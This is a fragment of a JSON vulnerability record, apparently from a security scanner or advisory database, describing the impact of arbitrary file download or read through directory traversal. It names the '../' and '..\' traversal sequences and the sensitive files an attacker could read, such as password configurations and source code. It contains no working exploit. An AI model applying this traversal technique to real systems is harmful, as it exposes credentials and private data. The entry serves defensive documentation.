  "Level": "2",
  "Impact": "<p>Arbitrary file download or read vulnerability is mainly because when the application system provides file download or read function, it directly specifies the file path in the file path parameter and does not verify the validity of the file path, so that the attacker can jump through the directory (..&nbsp; \\ or..&nbsp; /) to download or read files outside the original specified path.&nbsp; Attackers can download or read any files on the system through this vulnerability, such as database files, application system source code, password configuration information and other important sensitive information, resulting in sensitive information leakage of the system.&nbsp;&nbsp;<br></p>",
